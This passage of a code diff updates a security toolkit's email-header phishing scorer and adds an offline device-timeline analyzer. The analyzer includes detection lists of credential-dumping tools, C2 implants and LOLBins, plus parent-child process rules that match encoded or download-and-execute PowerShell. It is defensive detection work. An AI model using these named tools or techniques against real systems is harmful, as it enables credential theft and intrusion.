+        score+=10; flags.push({ sev:"warn", cat:"spoof", msg:`SPF MailFrom domain (${spfMailFromDomain}) ≠ From: domain (${fromDomain}) — display name spoofing possible` });
+      }
     }
     if (dkimResult==="pass" && dkimDomain && fromDomain && !fromDomain.endsWith(dkimDomain) && !dkimDomain.endsWith(fromDomain)) {
-      score+=8; flags.push({ sev:"warn", cat:"spoof", msg:`DKIM signing domain (${dkimDomain}) ≠ From: domain (${fromDomain}) — third-party signing, verify if expected` });
+      const isESPDkim = KNOWN_ESPS_ALIGN.some(e => dkimDomain.endsWith(e));
+      if (isESPDkim) {
+        flags.push({ sev:"info", cat:"spam", msg:`DKIM signed by ${dkimDomain} (known ESP) on behalf of ${fromDomain} — expected for email service providers` });
+      } else {
+        score+=8; flags.push({ sev:"warn", cat:"spoof", msg:`DKIM signing domain (${dkimDomain}) ≠ From: domain (${fromDomain}) — third-party signing, verify if expected` });
+      }
     }
 
     // ── Spoofing / BEC / Identity ────────────────────────────
@@ -8845,22 +8968,39 @@ Note: external OSINT may not return results for private IPs.</div>`;
 
     // ── Free provider impersonation ──────────────────────────
     const FREE_PROVIDERS = ["gmail.com","yahoo.com","hotmail.com","outlook.com","live.com","aol.com","protonmail.com","tutanota.com","icloud.com","me.com","ymail.com"];
-    if (fromDomain && FREE_PROVIDERS.includes(fromDomain) && fromName && fromName.length>3 && !FREE_PROVIDERS.some(p=>fromName.toLowerCase().includes(p.split(".")[0]))) {
-      score+=12; flags.push({ sev:"warn", cat:"bec", msg:`Free provider (${fromDomain}) with corporate-sounding display name "${fromName}" — possible impersonation to bypass domain-based filters` });
+    // Only flag if the display name contains a company/brand name (not just any person's name)
+    const CORP_NAME_PATTERNS = /(?:paypal|microsoft|apple|amazon|google|facebook|meta|netflix|bank|wells.fargo|chase|citibank|irs|fedex|ups|dhl|support|security|admin|billing|account|help.?desk|it.?dept|hr.dept|finance|payroll|ceo|cfo|cto|president|director|manager)/i;
+    // Only flag free provider if name matches a known brand/corp (not just a person's name)
+    const BRAND_IMPERSONATION_RE = /\b(?:paypal|microsoft|apple|amazon|google|facebook|meta|netflix|instagram|twitter|linkedin|dropbox|zoom|slack|stripe|shopify|squarespace|bank of america|wells fargo|chase|citi|barclays|hsbc|irs|fbi|cisa|fedex|ups|dhl|usps|irs alert|microsoft support|apple support|amazon support|paypal support|account team|security team|billing department|it helpdesk|it support)/i;
+    if (fromDomain && FREE_PROVIDERS.includes(fromDomain) && fromName && fromName.length>4 && BRAND_IMPERSONATION_RE.test(fromName)) {
+      score+=20; flags.push({ sev:"crit", cat:"bec", msg:`Known brand impersonation — "${fromName}" is using a free provider (${fromDomain}) instead of their official domain` });
     }
 
     // ── Infrastructure / relay ───────────────────────────────
     if (xOrigIP) flags.push({ sev:"info", cat:"infra", msg:`X-Originating-IP: ${xOrigIP} — the sender's actual mail client or submission IP` });
-    if (hops.length===0) { score+=20; flags.push({ sev:"crit", cat:"infra", msg:"No Received headers — headers may be completely forged or stripped by attacker" }); }
-    else if (hops.length===1) { score+=10; flags.push({ sev:"warn", cat:"infra", msg:"Only 1 relay hop — may indicate direct injection or header truncation" }); }
+    if (hops.length===0 && (spfResult==="fail" || dkimResult==="fail" || !spfResult)) {
+      score+=20; flags.push({ sev:"crit", cat:"infra", msg:"No Received headers — headers may be completely forged or stripped by attacker" });
+    } else if (hops.length===0) {
+      flags.push({ sev:"info", cat:"infra", msg:"No Received headers found — may be an internal/direct message or headers were stripped" });
+    } else if (hops.length===1 && (spfResult==="fail" || dkimResult==="fail")) {
+      score+=10; flags.push({ sev:"warn", cat:"infra", msg:"Only 1 relay hop combined with authentication failures — may indicate direct injection or forged headers" });
+    } else if (hops.length<=2) {
+      flags.push({ sev:"info", cat:"infra", msg:`${hops.length} relay hop${hops.length>1?"s":""} — normal for direct delivery from major providers (Google, Microsoft, etc.)` });
+    }
     if (hops.some(h=>h.delayWarn)) flags.push({ sev:"info", cat:"infra", msg:"Unusual relay delay (>5 min) detected — may indicate queuing, grey-listing, or clock skew" });
     if (!subject) { score+=5; flags.push({ sev:"warn", cat:"spam", msg:"No Subject line — atypical for legitimate mail" }); }
 
     // ── Clean verdict ────────────────────────────────────────
-    if (score===0 && spfResult==="pass" && dkimResult==="pass" && dmarcResult==="pass") {
+    const isAllAuthPass = spfResult==="pass" && dkimResult==="pass" && dmarcResult==="pass";
+    const isInternalMail = fromDomain && (fromDomain.split(".").every(p=>/[a-z]/i.test(p)) && !FREE_PROVIDERS.includes(fromDomain) && hops.length<=1 && !spfResult && !dkimResult);
+    if (isAllAuthPass && score===0) {
       flags.push({ sev:"ok", cat:"auth", msg:"SPF + DKIM + DMARC all PASS with correct alignment — strong authentication posture" });
-    } else if (score<10 && spfResult==="pass" && dkimResult==="pass") {
-      flags.push({ sev:"ok", cat:"auth", msg:"SPF and DKIM PASS — no major authentication failures" });
+    } else if (isAllAuthPass && score < 20) {
+      flags.push({ sev:"ok", cat:"auth", msg:`SPF: ${spfResult?.toUpperCase()}, DKIM: ${dkimResult?.toUpperCase()}, DMARC: ${dmarcResult?.toUpperCase()} — authentication passed. Minor informational signals only.` });
+    } else if (isInternalMail) {
+      flags.push({ sev:"info", cat:"auth", msg:"Internal mail — no external authentication expected for internal-only email" });
+    } else if (!spfResult && !dkimResult) {
+      flags.push({ sev:"warn", cat:"auth", msg:"No authentication results found — headers may be incomplete. Cannot verify sender legitimacy." });
     }
 
     return {
@@ -8887,127 +9027,145 @@ Note: external OSINT may not return results for private IPs.</div>`;
     if (!results) return;
     results.style.display = "block";
 
-    // ── Attack type badge colors ──────────────────────────────
-    const ATTACK_COLORS = {
-      "MALWARE DELIVERY":  { bg:"#f87171", text:"#fff" },
-      "AiTM PHISHING":     { bg:"#f87171", text:"#fff" },
-      "QRishing":          { bg:"#fb923c", text:"#fff" },
-      "CALLBACK PHISHING": { bg:"#fb923c", text:"#fff" },
-      "VISHING LURE":      { bg:"#fb923c", text:"#fff" },
-      "BEC / FRAUD":       { bg:"#a855f7", text:"#fff" },
-      "PHISHING":          { bg:"#f59e0b", text:"#fff" },
-      "SPAM / BULK":       { bg:"#64748b", text:"#fff" },
-      "SUSPICIOUS":        { bg:"#fbbf24", text:"#1e293b" },
-      "LIKELY CLEAN":      { bg:"#1D9E75", text:"#fff" },
-      "UNKNOWN":           { bg:"#6b7280", text:"#fff" },
-    };
-    const atColor = ATTACK_COLORS[r.attackType] || ATTACK_COLORS["UNKNOWN"];
+    // ══════════════════════════════════════════════════════════
+    // TOP VERDICT CARD — definitive CLEAN / SUSPICIOUS / MALICIOUS
+    // ══════════════════════════════════════════════════════════
+    const pct = Math.min(100, r.score);
+    let topVerdict, topColor, topBg, topIcon, topSummary, topAction;
 
-    // ── Score banner ──────────────────────────────────────────
+    if (r.attackType === "LIKELY CLEAN" || (r.spf==="pass" && r.dkim==="pass" && r.dmarc==="pass" && pct < 30)) {
+      topVerdict = "CLEAN — LIKELY LEGITIMATE";
+      topColor   = "#34d399"; topBg = "rgba(52,211,153,0.07)";
+      topIcon    = "✅";
+      topSummary = `This email passed all three authentication controls (SPF: ${(r.spf||"none").toUpperCase()}, DKIM: ${(r.dkim||"none").toUpperCase()}, DMARC: ${(r.dmarc||"none").toUpperCase()}) with correct domain alignment. No spoofing, brand impersonation, or attack patterns were detected.`;
+      topAction  = "No action required. Safe to treat as legitimate.";
+    } else if (r.attackType === "SPAM / BULK") {
+      topVerdict = "BULK / MARKETING EMAIL";
+      topColor   = "#94a3b8"; topBg = "rgba(148,163,184,0.07)";
+      topIcon    = "📬";
+      topSummary = `Sent via ${r.senderESP||"a marketing platform"} using bulk email infrastructure. Authentication is technically valid but the message is unsolicited bulk mail, not a targeted attack.`;
+      topAction  = "Low threat. Review sender, unsubscribe if unwanted.";
+    } else if ((r.verdictDrivers||[]).some(d=>d.weight==="critical") || 
+               (pct >= 60 && (r.spf==="fail" || r.dkim==="fail" || r.dmarc==="fail"))) {
+      // Only MALICIOUS if we have hard cryptographic evidence OR high score WITH auth failures
+      topVerdict = "MALICIOUS — DO NOT INTERACT";
+      topColor   = "#ef4444"; topBg = "rgba(239,68,68,0.07)";
+      topIcon    = "🚨";
+      const critCount = (r.verdictDrivers||[]).filter(d=>d.weight==="critical").length;
+      topSummary = `${critCount} critical signal${critCount>1?"s":""} confirmed. Attack type: ${r.attackType}. ${r.attackDetail||""}`;
+      topAction  = "Block sender domain, quarantine message, investigate all recipients.";
+    } else if (pct >= 30 && r.attackType !== "LIKELY CLEAN") {
+      topVerdict = "SUSPICIOUS — INVESTIGATE";
+      topColor   = "#fbbf24"; topBg = "rgba(251,191,36,0.07)";
+      topIcon    = "⚠️";
+      topSummary = `${r.confidence||"MEDIUM"} confidence — ${r.confidenceReason||"multiple warning signals detected without definitive proof."}`;
+      topAction  = "Verify with sender out-of-band. Do not click links or open attachments until confirmed legitimate.";
+    }
+
     const banner = $("eha-score-banner");
-    const pct  = Math.min(100, r.score);
-    const sCls = pct >= 60 ? "eha-score-phishing" : pct >= 25 ? "eha-score-suspicious" : "eha-score-clean";
-    const sLbl = pct >= 60 ? "HIGH RISK" : pct >= 25 ? "SUSPICIOUS" : "LOW RISK";
-    banner.className = `eha-score-banner ${sCls}`;
+    banner.className = "eha-score-banner";
     banner.innerHTML = `
-      <div class="eha-score-num">${pct}</div>
-      <div style="flex:1;min-width:0;">
-        <div class="eha-score-label" style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
-          ${sLbl}
-          <span style="font-size:11px;font-weight:900;padding:2px 12px;border-radius:20px;background:${atColor.bg};color:${atColor.text};letter-spacing:0.5px;">${r.attackType}</span>
+      <div style="width:100%;">
+        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:12px;">
+          <span style="font-size:22px;">${topIcon}</span>
+          <span style="font-size:15px;font-weight:900;color:${topColor};">${esc(topVerdict)}</span>
+          <span style="font-size:11px;background:${topColor}22;color:${topColor};border:1px solid ${topColor}44;padding:2px 10px;border-radius:10px;font-weight:700;">${esc(r.confidence||"MEDIUM")} CONFIDENCE</span>
+          <span style="font-size:10.5px;font-weight:900;padding:2px 12px;border-radius:20px;background:${topColor}22;color:${topColor};letter-spacing:.5px;">${esc(r.attackType)}</span>
+          <span style="font-size:11px;font-weight:800;color:#38bdf8;margin-left:auto;">Risk Score: ${pct}</span>
         </div>
-        <div class="eha-score-sub" style="margin-top:3px;">${esc(r.attackDetail)}</div>
-      </div>
-      <div class="eha-auth-checks">
-        ${(r.authChecks||[]).map(c=>`
-          <div class="eha-auth-check-row">
-            <span class="eha-auth-check-label">${c.label}</span>
-            <span class="eha-auth-badge ${c.cls}">${(c.result||"none").toUpperCase()}</span>
-            <span class="eha-auth-check-detail">${esc(c.detail)}</span>
-          </div>`).join("")}
+        <div style="font-size:12px;color:var(--text);line-height:1.7;margin-bottom:10px;">${esc(topSummary)}</div>
+        <div style="background:${topColor}12;border:1px solid ${topColor}30;border-radius:7px;padding:8px 12px;font-size:11.5px;color:${topColor};font-weight:700;">
+          ${topIcon} Analyst Action: ${esc(topAction)}
+        </div>
+        <div class="eha-auth-checks" style="margin-top:12px;">
+          ${(r.authChecks||[]).map(c=>`
+            <div class="eha-auth-check-row">
+              <span class="eha-auth-check-label">${esc(c.label)}</span>
+              <span class="eha-auth-badge ${c.cls}">${(c.result||"none").toUpperCase()}</span>
+              <span class="eha-auth-check-detail">${esc(c.detail)}</span>
+            </div>`).join("")}
+        </div>
       </div>`;
 
-    // ── Verdict explanation panel ────────────────────────────
+    // ══════════════════════════════════════════════════════════
+    // VERDICT EXPLANATION — why this verdict, driver by driver
+    // ══════════════════════════════════════════════════════════
     const explainEl = $("eha-verdict-explain");
     if (explainEl) {
-      if (r.verdictDrivers && r.verdictDrivers.length || r.confidence) {
-        const weightColors = { critical:"#ef4444", warning:"#fbbf24", clean:"#34d399" };
-        const weightLabels = { critical:"CRITICAL SIGNAL", warning:"WARNING SIGNAL", clean:"CLEAN SIGNAL" };
-        const driverRows = r.verdictDrivers.map(d => {
+      const drivers = r.verdictDrivers || [];
+      const weightColors = { critical:"#ef4444", warning:"#fbbf24", clean:"#34d399" };
+      const weightLabels = { critical:"🔴 CRITICAL SIGNAL", warning:"🟡 WARNING SIGNAL", clean:"🟢 CLEAN SIGNAL" };
+
+      if (drivers.length || r.confidence) {
+        const driverRows = drivers.map(d => {
           const c = weightColors[d.weight] || "#9ca3af";
-          const l = weightLabels[d.weight] || d.weight.toUpperCase();
-          return `<div style="display:flex;gap:10px;align-items:flex-start;padding:8px 12px;border-left:3px solid ${c};background:${c}08;border-radius:0 6px 6px 0;margin-bottom:6px;">
-            <span style="font-size:15px;flex-shrink:0;margin-top:1px;">${esc(d.icon)}</span>
+          return `<div style="display:flex;gap:10px;align-items:flex-start;padding:9px 14px;border-left:3px solid ${c};background:${c}06;margin-bottom:3px;">
+            <span style="font-size:15px;flex-shrink:0;">${esc(d.icon)}</span>
             <div style="flex:1;">
-              <div style="font-size:9.5px;font-weight:800;color:${c};text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">${l}</div>
-              <div style="font-size:11.5px;color:var(--text);line-height:1.65;">${esc(d.text)}</div>
+              <div style="font-size:9.5px;font-weight:800;color:${c};text-transform:uppercase;letter-spacing:.06em;margin-bottom:3px;">${esc(weightLabels[d.weight]||d.weight.toUpperCase())}</div>
+              <div style="font-size:11.5px;color:var(--text);line-height:1.7;">${esc(d.text)}</div>
             </div>
           </div>`;
         }).join("");
 
-        const confColor = r.confidenceColor || "#9ca3af";
+        // Add flag summary for warnings not already in drivers
+        const warnFlags = (r.flags||[]).filter(f => (f.sev==="warn"||f.sev==="crit") && !drivers.some(d => d.text.toLowerCase().includes(f.msg.slice(0,20).toLowerCase())));
+        const flagRows = warnFlags.slice(0,4).map(f => {
+          const c = f.sev==="crit" ? "#ef4444" : "#fbbf24";
+          return `<div style="display:flex;gap:8px;padding:7px 14px;border-left:2px solid ${c}55;background:${c}04;margin-bottom:2px;font-size:11px;color:var(--text);">
+            <span>${f.sev==="crit"?"🚨":"⚠️"}</span><span>${esc(f.msg)}</span></div>`;
+        }).join("");
+
         explainEl.style.display = "block";
         explainEl.innerHTML = `
           <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;">
-            <div style="background:rgba(0,0,0,0.15);padding:10px 14px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+            <div style="background:rgba(0,0,0,0.15);padding:10px 14px;display:flex;align-items:center;gap:8px;">
               <span style="font-size:12px;font-weight:800;color:var(--text);">🔍 Why this verdict?</span>
-              <span style="font-size:10px;background:${confColor}18;color:${confColor};border:1px solid ${confColor}44;padding:2px 10px;border-radius:10px;font-weight:700;">${esc(r.confidence)} CONFIDENCE</span>
-              <span style="font-size:11px;color:var(--muted);flex:1;">${esc(r.confidenceReason)}</span>
+              <span style="font-size:10px;color:var(--muted);">${drivers.length} key signal${drivers.length!==1?"s":""} drove this assessment</span>
             </div>
-            <div style="padding:12px 14px;">
-              ${driverRows}
-            </div>
+            ${driverRows || ""}
+            ${flagRows ? `<div style="padding:6px 0 2px;border-top:1px solid var(--border);">${flagRows}</div>` : ""}
+            ${!driverRows && !flagRows ? `<div style="padding:12px 14px;font-size:11.5px;color:var(--muted);">No specific threat signals detected. The email appears legitimate based on authentication controls.</div>` : ""}
           </div>`;
-      } else if (r.confidence) {
-        // No specific drivers but still show confidence summary
-        explainEl.style.display = "block";
-        const confColor = r.confidenceColor || "#9ca3af";
-        explainEl.innerHTML = '<div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:12px 14px;">' +
-          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;">' +
-          '<span style="font-size:12px;font-weight:800;color:var(--text);">🔍 Verdict Assessment</span>' +
-          '<span style="font-size:10px;background:' + confColor + '18;color:' + confColor + ';border:1px solid ' + confColor + '44;padding:2px 10px;border-radius:10px;font-weight:700;">' + esc(r.confidence) + ' CONFIDENCE</span></div>' +
-          '<div style="font-size:11.5px;color:var(--text);line-height:1.65;">' + esc(r.confidenceReason || "No threat signals detected in this email header.") + '</div>' +
-          '</div>';
       } else {
         explainEl.style.display = "none";
       }
     }
 
-    // ── Score banner update — add confidence badge ────────────
-    // (already rendered above, now enhance with confidence)
-    const confBadge = `<span style="font-size:10px;background:${r.confidenceColor||"#9ca3af"}22;color:${r.confidenceColor||"#9ca3af"};border:1px solid ${r.confidenceColor||"#9ca3af"}44;padding:1px 8px;border-radius:8px;font-weight:700;">${esc(r.confidence||"")} CONFIDENCE</span>`;
-
-    // ── Summary grid ──────────────────────────────────────────
+    // ── Summary grid ─────────────────────────────────────────
     const summaryItems = [
-      { label:"From",           value: r.fromEmail ? `${r.fromName?"\""+r.fromName+"\" <":""}${r.fromEmail}${r.fromName?">":""}` : r.from||"—" },
-      { label:"To",             value: r.toEmail||r.to||"—" },
-      { label:"Reply-To",       value: r.replyEmail ? `${r.replyEmail}${r.replyEmail!==r.fromEmail?" ⚠️ DIFFERS":""}` : "Same as From" },
-      { label:"Subject",        value: r.subject||"—" },
-      { label:"Date",           value: r.date||"—" },
-      { label:"Message-ID",     value: r.msgId||"—" },
-      { label:"Return-Path",    value: r.returnPath ? `${r.returnPath}${r.retDomain&&r.fromDomain&&r.retDomain!==r.fromDomain?" ⚠️ MISMATCH":""}` : "—" },
-      { label:"X-Originating-IP", value: r.xOrigIP||"Not disclosed" },
-      { label:"Mailer",         value: r.xMailer||"Not disclosed" },
-      { label:"Content-Type",   value: r.contentType||"—" },
-      { label:"Encoding",       value: r.contentTE||"—" },
-      { label:"Relay Hops",     value: `${r.hops.length} hop${r.hops.length!==1?"s":""}${r.hops.some(h=>h.tls)?" · TLS encrypted":""}` },
-      { label:"Spam Score",     value: r.xSpamScore||"—" },
-      { label:"Phish Score",    value: r.xPhishScore||"—" },
-      { label:"MS SCL",         value: r.microsoftSCL||"—" },
-      { label:"Barracuda",      value: r.barracuda||"—" },
-      { label:"List-ID",        value: r.listId||"—" },
-      { label:"Precedence",     value: r.precedence||"—" },
-      { label:"Campaign ID",    value: r.xCampaignId||"—" },
-      { label:"Attachments",    value: r.attachmentName?.join(", ")||"—" },
-    ].filter(s => s.value && s.value!=="—");
+      { label:"From",              value: r.fromEmail ? `${r.fromName?`"${r.fromName}" <`:""}${r.fromEmail}${r.fromName?">":""}` : r.from||"—" },
+      { label:"To",                value: r.toEmail||r.to||"—" },
+      { label:"Reply-To",          value: r.replyEmail ? `${r.replyEmail}${r.replyEmail!==r.fromEmail?" ⚠️ DIFFERS FROM SENDER":""}` : "Same as From" },
+      { label:"Subject",           value: r.subject||"—" },
+      { label:"Date",              value: r.date||"—" },
+      { label:"Message-ID",        value: r.msgId||"—" },
+      { label:"Return-Path",       value: r.returnPath ? `${r.returnPath}${r.retDomain&&r.fromDomain&&r.retDomain!==r.fromDomain?" ⚠️ DOMAIN MISMATCH":""}` : "—" },
+      { label:"X-Originating-IP",  value: r.xOrigIP||"Not disclosed" },
+      { label:"Mailer / ESP",       value: r.xMailer||r.senderESP||"Not disclosed" },
+      { label:"Content-Type",      value: r.contentType||"—" },
+      { label:"Relay Hops",        value: `${r.hops.length} hop${r.hops.length!==1?"s":""}${r.hops.some(h=>h.tls)?" · TLS encrypted":""}` },
+      { label:"Spam Score",        value: r.xSpamScore||"—" },
+      { label:"Phish Score",       value: r.xPhishScore||"—" },
+      { label:"Microsoft SCL",     value: r.microsoftSCL||"—" },
+      { label:"Campaign ID",       value: r.xCampaignId||"—" },
+      { label:"Attachments",       value: r.attachmentName?.join(", ")||"—" },
+    ].filter(s => s.value && s.value !== "—" && s.value !== "Not disclosed");
     $("eha-summary").innerHTML = summaryItems.map(s =>
-      `<div class="eha-summary-item"><div class="eha-summary-label">${s.label}</div><div class="eha-summary-value">${esc(String(s.value).slice(0,140))}</div></div>`
+      `<div class="eha-summary-item">
+        <div class="eha-summary-label">${esc(s.label)}</div>
+        <div class="eha-summary-value${s.value.includes("⚠️")?" eha-summary-warn":""}">${esc(String(s.value).slice(0,160))}</div>
+      </div>`
     ).join("");
 
     $("eha-auth").innerHTML = "";
 
     // ── Flag list grouped by category ────────────────────────
-    const CAT_LABELS = { auth:"🔐 Authentication", bec:"🎭 BEC / Identity", brand:"🏷 Brand / Domain", spoof:"🃏 Spoofing", attack:"⚔️ Attack Pattern", spam:"📬 Spam / Bulk", phish:"🎣 Phishing", infra:"🌐 Infrastructure" };
+    const CAT_LABELS = {
+      auth:"🔐 Authentication", bec:"🎭 BEC / Identity", brand:"🏷 Brand / Domain",
+      spoof:"🃏 Spoofing", attack:"⚔️ Attack Pattern", spam:"📬 Spam / Bulk",
+      phish:"🎣 Phishing", infra:"🌐 Infrastructure"
+    };
     const grouped = {};
     (r.flags||[]).forEach(f => { const c=f.cat||"infra"; if(!grouped[c]) grouped[c]=[]; grouped[c].push(f); });
     let flagsHtml = "";
@@ -9021,9 +9179,9 @@ Note: external OSINT may not return results for private IPs.</div>`;
         });
       }
     }
-    $("eha-flags").innerHTML = flagsHtml || `<div class="eha-flag-item eha-flag-info">ℹ️ No signals detected — paste complete headers for analysis</div>`;
+    $("eha-flags").innerHTML = flagsHtml || `<div class="eha-flag-item eha-flag-info">ℹ️ No signals detected</div>`;
 
-    // ── Hop chain ─────────────────────────────────────────────
+    // ── Hop chain ────────────────────────────────────────────
     const hopsEl = $("eha-hops");
     if (r.hops.length) {
       hopsEl.innerHTML = `<div class="eha-hop-row eha-hop-head"><span>#</span><span>From</span><span>By</span><span>IP</span><span>Protocol</span><span>Delay</span></div>` +
@@ -9031,15 +9189,15 @@ Note: external OSINT may not return results for private IPs.</div>`;
           <div class="eha-hop-num">${h.hop}</div>
           <div class="eha-hop-host" title="${esc(h.from)}">${esc((h.from||"?").slice(0,32))}${(h.from||"").length>32?"…":""}</div>
           <div class="eha-hop-host" title="${esc(h.by)}">${esc((h.by||"?").slice(0,28))}${(h.by||"").length>28?"…":""}</div>
-          <div class="eha-hop-ip">${h.ip?`<a href="https://www.abuseipdb.com/check/${encodeURIComponent(h.ip)}" target="_blank" style="color:#38bdf8;text-decoration:none;">${esc(h.ip)}</a> ${!isPrivateIPv4(h.ip)?"🌐":"🏠"}`:"<span style='color:var(--muted)'>—</span>"}</div>
+          <div class="eha-hop-ip">${h.ip ? '<a href="https://www.abuseipdb.com/check/' + encodeURIComponent(h.ip) + '" target="_blank" style="color:#38bdf8;text-decoration:none;">' + esc(h.ip) + '</a> ' + (!isPrivateIPv4(h.ip)?"🌐":"🏠") : "<span style='color:var(--muted)'>—</span>"}</div>
           <div style="font-size:10px;">${h.tls?"🔒 ":""}${h.via||""}</div>
           <div class="eha-hop-delay${h.delayWarn?" eha-hop-delay-warn":""}">${h.delay||"—"}</div>
         </div>`).join("");
     } else {
-      hopsEl.innerHTML = `<div style="padding:12px;font-size:11px;color:var(--muted);">⚠️ No Received headers found — may be incomplete or forged.</div>`;
+      hopsEl.innerHTML = `<div style="padding:12px;font-size:11px;color:var(--muted);">⚠️ No Received headers — may be incomplete or forged.</div>`;
     }
 
-    // ── Pivot buttons ─────────────────────────────────────────
+    // ── Pivot buttons ────────────────────────────────────────
     const pivots = [];
     if (r.fromEmail)   pivots.push(`<button class="eha-pivot-btn" onclick="pivotFromEHA('${esc(r.fromEmail)}','email')">🔍 Sender email</button>`);
     if (r.fromDomain)  pivots.push(`<button class="eha-pivot-btn" onclick="pivotFromEHA('${esc(r.fromDomain)}','domain')">🌐 From domain</button>`);
@@ -9047,7 +9205,7 @@ Note: external OSINT may not return results for private IPs.</div>`;
     if (r.replyEmail && r.replyEmail!==r.fromEmail) pivots.push(`<button class="eha-pivot-btn" onclick="pivotFromEHA('${esc(r.replyEmail)}','email')">📧 Reply-To</button>`);
     if (r.lookalikeDomain && r.lookalikeDomain!==r.fromDomain) pivots.push(`<button class="eha-pivot-btn" onclick="pivotFromEHA('${esc(r.lookalikeDomain)}','domain')">🏷 Lookalike domain</button>`);
     if (r.dkimDomain && r.dkimDomain!==r.fromDomain) pivots.push(`<button class="eha-pivot-btn" onclick="pivotFromEHA('${esc(r.dkimDomain)}','domain')">🔐 DKIM domain</button>`);
-    hops_ips = r.hops.map(h=>h.ip).filter(Boolean);
+    const hops_ips = r.hops.map(h=>h.ip).filter(Boolean);
     if (hops_ips.length) pivots.push(`<button class="eha-pivot-btn" onclick="copyEHAHops()">📋 Copy ${hops_ips.length} hop IP${hops_ips.length>1?"s":""}</button>`);
     $("eha-pivots").innerHTML = pivots.join("");
     window._ehaResult = r;
@@ -11655,4 +11813,709 @@ Generated by HawkEye v${TOOLKIT_VERSION}`;
     now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
     tlTimeInput.value = now.toISOString().slice(0,16);
   }
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // DEVICE TIMELINE ANALYZER — fully offline, no network calls
+  // ══════════════════════════════════════════════════════════════════════════
+
+  // ── Offline Process Intelligence DB ──────────────────────────────────────
+  const DT_PROCESS_DB = {
+    // Known malicious / hacking tools
+    malicious: new Set([
+      "mimikatz.exe","mimilib.dll","wce.exe","pwdump.exe","pwdump7.exe",
+      "procdump.exe","fgdump.exe","gsecdump.exe","cachedump.exe",
+      "cobaltstrikeservice.exe","cobaltstrike.exe","beacon.exe",
+      "meterpreter.exe","msf.exe","payload.exe","stager.exe",
+      "havoc.exe","sliver.exe","bruteratel.exe","nighthawk.exe",
+      "empire.exe","pupy.exe","quasar.exe","njrat.exe","darkcomet.exe",
+      "asyncrat.exe","remcos.exe","nanocore.exe","azorult.exe",
+      "emotet.exe","trickbot.exe","ryuk.exe","conti.exe","lockbit.exe",
+      "wannacry.exe","notpetya.exe","ransomware.exe",
+    ]),
+    // Known LOLBins that are abused (legitimate binaries used maliciously)
+    lolbins: new Set([
+      "certutil.exe","mshta.exe","wmic.exe","regsvr32.exe","rundll32.exe",
+      "cmstp.exe","msiexec.exe","odbcconf.exe","pcalua.exe","regasm.exe",
+      "regsvcs.exe","installutil.exe","csc.exe","vbc.exe","jsc.exe",
+      "msbuild.exe","msdt.exe","presentationhost.exe","infdefaultinstall.exe",
+      "ieexec.exe","appsyncpublishingserver.exe","ftp.exe","winrm.cmd",
+      "syncappvpublishingserver.exe","bash.exe","forfiles.exe",
+      "desktopimgdownldr.exe","esentutl.exe","mavinject.exe","dnscmd.exe",
+      "diskshadow.exe","bginfo.exe","cscript.exe","wscript.exe",
+      "control.exe","xwizard.exe","scriptrunner.exe","pcwrun.exe",
+    ]),
+    // Legitimate system processes (Windows)
+    legitimate: new Set([
+      "svchost.exe","lsass.exe","csrss.exe","wininit.exe","winlogon.exe",
+      "services.exe","smss.exe","explorer.exe","taskmgr.exe","mmc.exe",
+      "dllhost.exe","conhost.exe","spoolsv.exe","SearchIndexer.exe",
+      "RuntimeBroker.exe","sihost.exe","fontdrvhost.exe","dwm.exe",
+      "audiodg.exe","MsMpEng.exe","SecurityHealthService.exe","WmiPrvSE.exe",
+      "SearchProtocolHost.exe","SearchFilterHost.exe","TiWorker.exe",
+      "TrustedInstaller.exe","WerFault.exe","WerMgr.exe","consent.exe",
+      "UserOOBEBroker.exe","backgroundTaskHost.exe","SystemSettingsBroker.exe",
+    ]),
+    // Expected paths for system processes (wrong path = suspicious)
+    expectedPaths: {
+      "svchost.exe":    ["c:\\windows\\system32\\","c:\\windows\\syswow64\\"],
+      "lsass.exe":      ["c:\\windows\\system32\\"],
+      "csrss.exe":      ["c:\\windows\\system32\\"],
+      "wininit.exe":    ["c:\\windows\\system32\\"],
+      "winlogon.exe":   ["c:\\windows\\system32\\"],
+      "services.exe":   ["c:\\windows\\system32\\"],
+      "smss.exe":       ["c:\\windows\\system32\\"],
+      "explorer.exe":   ["c:\\windows\\"],
+      "taskmgr.exe":    ["c:\\windows\\system32\\"],
+      "spoolsv.exe":    ["c:\\windows\\system32\\"],
+    },
+  };
+
+  // ── Malicious parent→child relationship rules ─────────────────────────────
+  const DT_PARENT_CHILD_RULES = [
+    { parent:/\b(winword|excel|powerpnt|outlook|onenote)\.exe\b/i,  child:/\b(powershell|cmd|wscript|cscript|mshta|regsvr32|rundll32|certutil|wmic)\.exe\b/i, sev:"critical", label:"Office application spawned a script interpreter — classic macro attack", mitre:["T1566.001","T1059"] },
+    { parent:/\bexplorer\.exe\b/i,  child:/\b(powershell|cmd)\.exe\b/i,  cmdPattern:/-enc\b|-encoded\b|downloadstring|iex\b/i, sev:"critical", label:"Explorer spawned encoded/download PowerShell", mitre:["T1059.001"] },
+    { parent:/\bbrowser|chrome|firefox|msedge|iexplore\b/i, child:/\b(powershell|cmd|wscript|mshta|rundll32)\.exe\b/i, sev:"critical", label:"Browser spawned a script/shell process — possible drive-by or ClickFix attack", mitre:["T1204.002","T1059"] },
+    { parent:/\bwscript\.exe|cscript\.exe\b/i, child:/\b(powershell|cmd|mshta|regsvr32)\.exe\b/i, sev:"critical", label:"Script host spawned another interpreter — staged execution", mitre:["T1059.005","T1059.001"] },
+    { parent:/\bmshta\.exe\b/i, child:/\b(powershell|cmd|wscript|regsvr32)\.exe\b/i, sev:"critical", label:"MSHTA LOLBin spawned shell — HTA-based attack", mitre:["T1218.005"] },
+    { parent:/\bsvchost\.exe\b/i, child:/\b(cmd|powershell|wscript|cscript|mshta)\.exe\b/i, sev:"high", label:"Svchost spawned interactive shell — unusual, possible service abuse", mitre:["T1543.003"] },
+    { parent:/\btaskmgr\.exe|mmc\.exe\b/i, child:/\b(powershell|cmd)\.exe\b/i, cmdPattern:/\-[eE]nc\b|\-[eE]ncodedCommand\b/i, sev:"high", label:"Task manager/MMC spawned encoded PowerShell", mitre:["T1059.001"] },
